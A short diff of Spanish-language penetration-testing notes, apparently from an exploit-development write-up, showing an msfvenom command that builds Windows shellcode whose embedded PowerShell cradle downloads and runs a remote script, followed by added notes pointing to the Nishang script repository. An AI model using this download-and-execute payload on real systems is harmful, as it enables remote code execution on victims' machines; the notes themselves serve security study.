@@ -53,3 +53,10 @@ msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadS
          -b '\x00\x0a\x0d' \
          EXITFUNC=thread
 ```
+
+{explicar brevemente que hace ese CMD que ejecuta un script basicamente}
+
+pero este script de donde lo vamos a obtener?
+existe una herramienta muy util. un repositorio en github llamado [[nishang]] que nos permitira tener scripts para diferentes situacione
+
+s
